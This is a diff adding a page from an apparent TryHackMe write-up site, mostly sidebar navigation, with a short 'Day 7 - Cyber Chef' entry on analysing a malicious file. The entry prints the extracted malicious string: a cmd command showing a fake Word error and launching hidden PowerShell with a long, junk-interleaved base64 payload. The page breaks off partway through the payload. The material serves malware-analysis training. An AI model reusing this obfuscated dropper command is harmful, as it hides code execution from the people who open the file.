+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../authenticationbypass/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Authentication Bypass
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basicpentesting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Basic Pentesting
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blue/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Blue
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../commandinjection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Command Injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../commonlinuxprivesc/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Common Linux Privesc
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crosssitescripting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cross-site Scripting
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../fileinclusion/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    File Inclusion
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hydra/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hydra
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../idor/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    IDOR
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../johntheripper/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    John the Ripper
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../kenobi/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kenobi
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../linuxprivesc/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux PrivEsc
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../metasploitexploitation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Metasploit - Exploitation
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../metasploitmeterpreter/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Metasploit - Meterpreter
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../motherssecret/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Mother's Secret
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../owaspjuiceshop/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OWASP Juice Shop
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../owasptop10_2021/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OWASP Top 10 - 2021
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../picklerick/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pickle Rick
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../sqlinjection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SQL Injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../sqlinjectionlab/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SQL Injection Lab
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ssrf/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSRF
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../steelmountain/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Steel Mountain
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../subdomainenumeration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Subdomain Enumeration
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../traverse/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Traverse
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../uploadvulnerabilities/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Upload Vulnerabilities
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../vulnversity/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Vulnversity
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../whattheshell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    What the Shell?
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Introduction
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  <h1>Day 7 - Cyber Chef</h1>
+
+<h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h2>
+<p>This day's challenge has excellent notes on how to use <code>CyberChef</code> to examine malicious files and extract useful information out of them.</p>
+<p>Use <code>Strings</code> recipe with a minimum length of 258 to isolate the malicious code in the file.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>c[_]m[_]d[_] [_]c[_]m[_]d[_] [_]c[_]m[_]d[_] [_]c[_]m[_]d[_] [_]/[_]c[_] [_]m[_]s[_]g[_] [_]%[_]u[_]s[_]e[_]r[_]n[_]a[_]m[_]e[_]%[_] [_]/[_]v[_] [_]W[_]o[_]r[_]d[_] [_]e[_]x[_]p[_]e[_]r[_]i[_]e[_]n[_]c[_]e[_]d[_] [_]a[_]n[_] [_]e[_]r[_]r[_]o[_]r[_] [_]t[_]r[_]y[_]i[_]n[_]g[_] [_]t[_]o[_] [_]o[_]p[_]e[_]n[_] [_]t[_]h[_]e[_] [_]f[_]i[_]l[_]e[_].[_] [_]&amp;[_] [_]P[_]^[_]O[_]w[_]^[_]e[_]r[_]^[_]s[_]h[_]e[_]^[_]L[_]^[_]L[_] [_]-[_]w[_] [_]h[_]i[_]d[_]d[_]e[_]n[_] [_]-[_]E[_]N[_]C[_]O[_]D[_] [_] [_]U[_]w[_]
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>B[_]F[_]A[_]F[_]Q[_]A[_]L[_]Q[_]B[_]W[_]A[_]G[_]E[_]A[_]c[_]g[_]B[_]J[_]A[_]E[_]E[_]A[_]Q[_]g[_]B[_]s[_]A[_]G[_]U[_]A[_]I[_]A[_]A[_]g[_]A[_]D[_]g[_]A[_]a[_]Q[_]B[_]o[_]A[_]D[_]U[_]A[_]N[_]g[_]A[_]3[_]A[_]C[_]A[_]A[_]I[_]A[_]A[_]o[_]A[_]C[_]A[_]A[_]I[_]A[_]B[_]b[_]A[_]H[_]Q[_]A[_]W[_]Q[_]B[_]w[_]A[_]G[_]U[_]A[_]X[_]Q[_]A[_]o[_]A[_]C[_]I[_]A[_]e[_]w[_]A[_]z[_]A[_]H[_]0[_]A[_]e[_]w[_]A[_]w[_]A[_]H[_]0[_]A[_]e[_]w[_]A[_]0[_]A[_]H[_]0[_]A[_]e[_]w[_]A[_]y[_]A[_]H[_]0[_]A[_]e[_]w[_]A[_]x[_]A[_]H[_]0[_]
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>A[_]I[_]g[_]A[_]t[_]A[_]G[_]Y[_]A[_]J[_]w[_]B[_]Z[_]A[_]H[_]M[_]A[_]V[_]A[_]A[_]n[_]A[_]C[_]w[_]A[_]J[_]w[_]B[_]S[_]A[_]G[_]U[_]A[_]Y[_]w[_]B[_]U[_]A[_]E[_]8[_]A[_]U[_]g[_]B[_]5[_]A[_]C[_]c[_]A[_]L[_]A[_]A[_]n[_]A[_]E[_]0[_]A[_]L[_]g[_]B[_]p[_]A[_]E[_]8[_]A[_]L[_]g[_]B[_]E[_]A[_]E[_]k[_]A[_]J[_]w[_]A[_]s[_]A[_]C[_]c[_]A[_]c[_]w[_]A[_]n[_]A[_]C[_]w[_]A[_]J[_]w[_]B[_]l[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]p[_]A[_]D[_]s[_]A[_]I[_]A[_]A[_]g[_]A[_]C[_]A[_]A[_]U[_]w[_]B[_]F[_]A[_]F[_]Q[_]A[_]L[_]Q[_]B[_]J[_]
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>A[_]H[_]Q[_]A[_]Z[_]Q[_]B[_]t[_]A[_]C[_]A[_]A[_]K[_]A[_]A[_]i[_]A[_]H[_]Y[_]A[_]Q[_]Q[_]A[_]i[_]A[_]C[_]s[_]A[_]I[_]g[_]B[_]S[_]A[_]G[_]k[_]A[_]Q[_]Q[_]A[_]i[_]A[_]C[_]s[_]A[_]I[_]g[_]B[_]i[_]A[_]E[_]w[_]A[_]Z[_]Q[_]A[_]6[_]A[_]F[_]I[_]A[_]I[_]g[_]A[_]r[_]A[_]C[_]I[_]A[_]a[_]Q[_]A[_]i[_]A[_]C[_]s[_]A[_]I[_]g[_]A[_]3[_]A[_]H[_]g[_]A[_]T[_]w[_]A[_]z[_]A[_]C[_]I[_]A[_]K[_]Q[_]A[_]g[_]A[_]C[_]g[_]A[_]W[_]w[_]B[_]U[_]A[_]H[_]k[_]A[_]U[_]A[_]B[_]l[_]A[_]F[_]0[_]A[_]K[_]A[_]A[_]i[_]A[_]H[_]s[_]A[_]M[_]
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>g[_]B[_]9[_]A[_]H[_]s[_]A[_]N[_]Q[_]B[_]9[_]A[_]H[_]s[_]A[_]N[_]A[_]B[_]9[_]A[_]H[_]s[_]A[_]M[_]w[_]B[_]9[_]A[_]H[_]s[_]A[_]M[_]Q[_]B[_]9[_]A[_]H[_]s[_]A[_]M[_]A[_]B[_]9[_]A[_]C[_]I[_]A[_]L[_]Q[_]B[_]G[_]A[_]C[_]A[_]A[_]J[_]w[_]B[_]S[_]A[_]C[_]c[_]A[_]L[_]A[_]A[_]n[_]A[_]E[_]0[_]A[_]Y[_]Q[_]B[_]O[_]A[_]G[_]E[_]A[_]R[_]w[_]B[_]F[_]A[_]C[_]c[_]A[_]L[_]A[_]A[_]n[_]A[_]F[_]M[_]A[_]J[_]w[_]A[_]s[_]A[_]C[_]c[_]A[_]V[_]g[_]B[_]J[_]A[_]G[_]M[_]A[_]R[_]Q[_]B[_]Q[_]A[_]G[_]8[_]A[_]S[_]Q[_]B[_]u[_]A[_]H[_]
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>Q[_]A[_]J[_]w[_]A[_]s[_]A[_]C[_]c[_]A[_]L[_]g[_]B[_]u[_]A[_]G[_]U[_]A[_]V[_]A[_]A[_]u[_]A[_]H[_]M[_]A[_]R[_]Q[_]B[_]y[_]A[_]C[_]c[_]A[_]L[_]A[_]A[_]n[_]A[_]F[_]k[_]A[_]c[_]w[_]B[_]0[_]A[_]G[_]U[_]A[_]b[_]Q[_]A[_]n[_]A[_]C[_]k[_]A[_]I[_]A[_]A[_]p[_]A[_]C[_]A[_]A[_]I[_]A[_]A[_]7[_]A[_]C[_]A[_]A[_]I[_]A[_]A[_]k[_]A[_]E[_]U[_]A[_]c[_]g[_]B[_]y[_]A[_]G[_]8[_]A[_]c[_]g[_]B[_]B[_]A[_]G[_]M[_]A[_]d[_]A[_]B[_]p[_]A[_]G[_]8[_]A[_]b[_]g[_]B[_]Q[_]A[_]H[_]I[_]A[_]Z[_]Q[_]B[_]m[_]A[_]G[_]U[_]A[_]c[_]g[_]B[_]
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>l[_]A[_]G[_]4[_]A[_]Y[_]w[_]B[_]l[_]A[_]C[_]A[_]A[_]P[_]Q[_]A[_]g[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]T[_]A[_]G[_]k[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]s[_]A[_]G[_]U[_]A[_]b[_]g[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]0[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]s[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]H[_]k[_]A[_]Q[_]w[_]B[_]v[_]A[_]G[_]4[_]A[_]d[_]A[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]w[_]A[_]n[_]A[_]G[_]k[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]u[_]A[_]C[_]c[_]A[_]
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>K[_]w[_]A[_]n[_]A[_]H[_]U[_]A[_]Z[_]Q[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]Q[_]A[_]7[_]A[_]C[_]Q[_]A[_]d[_]g[_]B[_]h[_]A[_]H[_]I[_]A[_]X[_]w[_]B[_]B[_]A[_]D[_]0[_]A[_]J[_]A[_]B[_]Q[_]A[_]D[_]U[_]A[_]O[_]A[_]B[_]C[_]A[_]C[_]A[_]A[_]K[_]w[_]A[_]g[_]A[_]F[_]s[_]A[_]Y[_]w[_]B[_]o[_]A[_]G[_]E[_]A[_]c[_]g[_]B[_]d[_]A[_]C[_]g[_]A[_]N[_]g[_]A[_]0[_]A[_]C[_]k[_]A[_]I[_]A[_]A[_]r[_]A[_]C[_]A[_]A[_]J[_]A[_]B[_]a[_]A[_]D[_]E[_]A[_]O[_]Q[_]B[_]S[_]A[_]D[_]s[_]A[_]J[_]A[_]B[_]C[_]A[_]D[_]U[_]A[_]M[_]w[_]B[_]O[_]A[_]
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>D[_]0[_]A[_]K[_]A[_]A[_]o[_]A[_]C[_]c[_]A[_]U[_]w[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]A[_]3[_]A[_]D[_]c[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]I[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]7[_]A[_]C[_]A[_]A[_]I[_]A[_]A[_]o[_]A[_]C[_]A[_]A[_]I[_]A[_]B[_]s[_]A[_]H[_]M[_]A[_]I[_]A[_]A[_]g[_]A[_]F[_]Y[_]A[_]Y[_]Q[_]B[_]y[_]A[_]E[_]k[_]A[_]Y[_]Q[_]B[_]C[_]A[_]E[_]w[_]A[_]R[_]Q[_]A[_]6[_]A[_]D[_]g[_]A[_]a[_]Q[_]B[_]o[_]A[_]D[_]U[_]A[_]N[_]g[_]A[_]3[_]A[_]C[_]A[_]A[_]I[_]A[_]A[_]p[_]A[_]C[_]4[_]A[_]V[_]g[_]
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>B[_]h[_]A[_]G[_]w[_]A[_]d[_]Q[_]B[_]l[_]A[_]D[_]o[_]A[_]O[_]g[_]A[_]i[_]A[_]E[_]M[_]A[_]U[_]g[_]B[_]F[_]A[_]E[_]E[_]A[_]d[_]A[_]B[_]g[_]A[_]E[_]U[_]A[_]Y[_]A[_]B[_]E[_]A[_]G[_]A[_]A[_]a[_]Q[_]B[_]S[_]A[_]G[_]U[_]A[_]Y[_]w[_]B[_]U[_]A[_]E[_]8[_]A[_]c[_]g[_]B[_]Z[_]A[_]C[_]I[_]A[_]K[_]A[_]A[_]k[_]A[_]E[_]g[_]A[_]T[_]w[_]B[_]N[_]A[_]E[_]U[_]A[_]I[_]A[_]A[_]r[_]A[_]C[_]A[_]A[_]K[_]A[_]A[_]o[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]l[_]A[_]E[_]4[_]A[_]N[_]w[_]B[_]S[_]A[_]H[_]I[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>A[_]M[_]Q[_]B[_]z[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]G[_]o[_]A[_]O[_]Q[_]B[_]h[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]G[_]U[_]A[_]T[_]g[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]w[_]A[_]n[_]A[_]D[_]c[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]C[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]G[_]M[_]A[_]e[_]A[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]w[_]A[_]o[_]A[_]C[_]c[_]A[_]N[_]A[_]B[_]p[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]G[_]E[_]A[_]e[_]Q[_]B[_]l[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]c[_]A[_]T[_]g[_]A[_]3[_]
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>A[_]C[_]c[_]A[_]K[_]Q[_]A[_]u[_]A[_]C[_]I[_]A[_]c[_]g[_]B[_]l[_]A[_]F[_]A[_]A[_]Y[_]A[_]B[_]M[_]A[_]G[_]E[_]A[_]Y[_]A[_]B[_]j[_]A[_]E[_]U[_]A[_]I[_]g[_]A[_]o[_]A[_]C[_]g[_]A[_]W[_]w[_]B[_]D[_]A[_]E[_]g[_]A[_]Y[_]Q[_]B[_]S[_]A[_]F[_]0[_]A[_]M[_]Q[_]A[_]w[_]A[_]D[_]E[_]A[_]K[_]w[_]B[_]b[_]A[_]E[_]M[_]A[_]S[_]A[_]B[_]h[_]A[_]F[_]I[_]A[_]X[_]Q[_]A[_]3[_]A[_]D[_]g[_]A[_]K[_]w[_]B[_]b[_]A[_]E[_]M[_]A[_]S[_]A[_]B[_]h[_]A[_]F[_]I[_]A[_]X[_]Q[_]A[_]1[_]A[_]D[_]U[_]A[_]K[_]Q[_]A[_]s[_]A[_]E[_]g[_]A[_]X[_]
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>w[_]B[_]U[_]A[_]H[_]I[_]A[_]a[_]Q[_]B[_]u[_]A[_]E[_]c[_]A[_]X[_]Q[_]B[_]b[_]A[_]E[_]M[_]A[_]S[_]A[_]B[_]h[_]A[_]F[_]I[_]A[_]X[_]Q[_]A[_]5[_]A[_]D[_]I[_]A[_]K[_]Q[_]A[_]p[_]A[_]C[_]k[_]A[_]O[_]w[_]A[_]k[_]A[_]F[_]Y[_]A[_]N[_]Q[_]A[_]3[_]A[_]F[_]I[_]A[_]P[_]Q[_]A[_]o[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]C[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]D[_]Q[_]A[_]N[_]g[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]w[_]A[_]n[_]A[_]F[_]Y[_]A[_]J[_]w[_]A[_]p[_]A[_]D[_]s[_]A[_]I[_]A[_]A[_]o[_]A[_]H[_]Y[_]A[_]Y[_]Q[_]B[_]S[_]A[_]E[_]
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>k[_]A[_]Y[_]Q[_]B[_]C[_]A[_]G[_]w[_]A[_]Z[_]Q[_]A[_]g[_]A[_]C[_]g[_]A[_]I[_]g[_]B[_]S[_]A[_]C[_]I[_]A[_]K[_]w[_]A[_]i[_]A[_]G[_]k[_]A[_]I[_]g[_]A[_]r[_]A[_]C[_]I[_]A[_]N[_]w[_]B[_]4[_]A[_]E[_]8[_]A[_]M[_]w[_]A[_]i[_]A[_]C[_]k[_]A[_]I[_]A[_]A[_]p[_]A[_]C[_]4[_]A[_]V[_]g[_]B[_]B[_]A[_]G[_]w[_]A[_]V[_]Q[_]B[_]F[_]A[_]D[_]o[_]A[_]O[_]g[_]A[_]i[_]A[_]F[_]M[_]A[_]Z[_]Q[_]B[_]D[_]A[_]H[_]U[_]A[_]c[_]g[_]B[_]J[_]A[_]G[_]A[_]A[_]V[_]A[_]B[_]g[_]A[_]H[_]k[_]A[_]U[_]A[_]B[_]g[_]A[_]F[_]I[_]A[_]T[_]w[_]B[_]
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>g[_]A[_]F[_]Q[_]A[_]b[_]w[_]B[_]D[_]A[_]E[_]8[_]A[_]T[_]A[_]A[_]i[_]A[_]C[_]A[_]A[_]P[_]Q[_]A[_]g[_]A[_]C[_]g[_]A[_]K[_]A[_]A[_]n[_]A[_]F[_]Q[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]b[_]A[_]B[_]z[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]c[_]A[_]M[_]Q[_]A[_]y[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]7[_]A[_]C[_]Q[_]A[_]W[_]A[_]A[_]0[_]A[_]D[_]Q[_]A[_]U[_]w[_]A[_]9[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]T[_]A[_]D[_]g[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]M[_]Q[_]B[_]E[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]7[_]A[_]C[_]Q[_]A[_]
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>U[_]A[_]B[_]h[_]A[_]D[_]I[_]A[_]b[_]g[_]B[_]1[_]A[_]H[_]I[_]A[_]N[_]A[_]A[_]g[_]A[_]D[_]0[_]A[_]I[_]A[_]A[_]o[_]A[_]C[_]c[_]A[_]S[_]w[_]A[_]n[_]A[_]C[_]s[_]A[_]K[_]A[_]A[_]n[_]A[_]F[_]8[_]A[_]O[_]Q[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]P[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]p[_]A[_]D[_]s[_]A[_]J[_]A[_]B[_]P[_]A[_]D[_]Y[_]A[_]N[_]g[_]B[_]H[_]A[_]D[_]0[_]A[_]K[_]A[_]A[_]o[_]A[_]C[_]c[_]A[_]R[_]g[_]A[_]4[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]D[_]g[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]X[_]A[_]
+<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>C[_]c[_]A[_]K[_]Q[_]A[_]7[_]A[_]C[_]Q[_]A[_]Q[_]w[_]B[_]5[_]A[_]G[_]c[_]A[_]M[_]A[_]B[_]r[_]A[_]H[_]U[_]A[_]N[_]w[_]A[_]9[_]A[_]C[_]Q[_]A[_]S[_]A[_]B[_]P[_]A[_]E[_]0[_]A[_]R[_]Q[_]A[_]r[_]A[_]C[_]g[_]A[_]K[_]A[_]A[_]o[_]A[_]C[_]c[_]A[_]Z[_]Q[_]B[_]B[_]A[_]H[_]c[_]A[_]U[_]g[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]y[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]A[_]x[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]H[_]M[_]A[_]a[_]g[_]A[_]5[_]A[_]G[_]E[_]A[_]Z[_]Q[_]B[_]B[_]A[_]C[_]c[_]A[_]K[_]Q[_]
+<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]3[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]E[_]I[_]A[_]Y[_]w[_]B[_]4[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]A[_]0[_]A[_]G[_]k[_]A[_]Y[_]Q[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]5[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]G[_]U[_]A[_]Q[_]Q[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]w[_]A[_]n[_]A[_]H[_]c[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]A[_]A[_]L[_]Q[_]B[_]y[_]A[_]G[_]U[_]A[_]c[_]A[_]B[_]M[_]A[_]E[_]E[_]A[_]Q[_]w[_]B[_]l[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]l[_]A[_]E[_]E[_]
+<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]d[_]w[_]A[_]n[_]A[_]C[_]k[_]A[_]L[_]A[_]B[_]b[_]A[_]G[_]M[_]A[_]a[_]A[_]B[_]h[_]A[_]F[_]I[_]A[_]X[_]Q[_]A[_]5[_]A[_]D[_]I[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]Q[_]A[_]U[_]A[_]B[_]h[_]A[_]D[_]I[_]A[_]b[_]g[_]B[_]1[_]A[_]H[_]I[_]A[_]N[_]A[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]A[_]u[_]A[_]G[_]Q[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]b[_]A[_]B[_]s[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]7[_]A[_]C[_]Q[_]A[_]R[_]Q[_]A[_]w[_]A[_]D[_]E[_]A[_]Q[_]g[_]A[_]9[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]S[_]
